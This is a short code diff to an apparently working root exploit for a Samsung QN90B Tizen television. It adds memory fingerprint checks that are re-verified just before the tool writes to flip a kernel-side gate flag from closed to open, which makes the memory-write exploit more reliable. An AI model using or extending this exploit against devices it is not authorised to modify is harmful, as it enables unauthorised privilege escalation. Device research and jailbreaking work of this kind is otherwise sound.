@@ -67,6 +67,12 @@ SCAN_LENGTH = "0x4a000000"
 UEP_GATE_CANDIDATES = ("0x208c26c0",)
 UEP_GATE_FLAG_WORD = 1
 UEP_GATE_FINGERPRINT = {0: "c07bd300", 2: "00000000", 3: "000004e2"}
+# Neighbour checks passed to FdetProbe's wwi so the full fingerprint is
+# re-verified on the write's own mapping immediately before the store, not
+# just on the separate preflight read mapping.
+UEP_GATE_NEIGHBOUR_CHECKS = ",".join(
+    f"{offset}:{value}" for offset, value in sorted(UEP_GATE_FINGERPRINT.items())
+)
 UEP_GATE_CLOSED = "0x00000001"
 UEP_GATE_OPEN = "0x00000000"
 STOCK_SOCAT = PurePosixPath("/opt/usr/apps/com.samsung.tizen.smartthings-hub/bin/socat")
@@ -245,6 +251,7 @@ class Qn90bRootExploit:
                 str(UEP_GATE_FLAG_WORD),
                 UEP_GATE_CLOSED,
                 UEP_GATE_OPEN,
+                UEP_GATE_NEIGHBOUR_CHECKS,
             )
         )
         result = self.sdb.capture(invocation, timeout=15.0)
